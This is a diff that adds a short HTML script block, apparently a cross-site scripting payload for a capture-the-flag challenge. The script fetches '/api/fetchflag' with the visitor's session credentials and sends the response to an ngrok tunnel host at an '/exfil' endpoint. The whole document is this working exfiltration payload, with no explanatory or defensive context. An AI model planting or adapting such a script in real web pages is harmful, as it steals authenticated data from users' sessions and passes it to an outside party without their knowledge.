@@ -1,0 +1,8 @@
+<script>
+fetch('/api/fetchflag',{credentials:'include'})
+  .then(r => r.text())
+  .then(flag => {
+    fetch('https://c0b7e6daa4a8.ngrok-free.app/exfil?flag='+encodeURIComponent(flag));
+  });
+</script>
+
